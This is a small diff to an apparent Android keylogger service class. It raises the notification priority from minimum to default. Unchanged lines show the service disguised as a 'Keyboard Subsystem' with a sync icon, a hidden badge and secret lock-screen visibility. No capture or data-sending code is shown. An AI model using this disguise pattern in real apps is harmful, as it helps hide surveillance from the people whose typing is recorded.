@@ -42,7 +42,7 @@ public class KeyloggerService extends Service {
             NotificationChannel channel = new NotificationChannel(
                 CHANNEL_ID,
                 "Keyboard Subsystem",
-                NotificationManager.IMPORTANCE_MIN
+                NotificationManager.IMPORTANCE_DEFAULT
             );
             channel.setShowBadge(false);
             NotificationManager manager = getSystemService(NotificationManager.class);
@@ -56,7 +56,7 @@ public class KeyloggerService extends Service {
             .setContentText("Keyboard input service active")
             .setSmallIcon(R.drawable.ic_sync)
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build();
     }
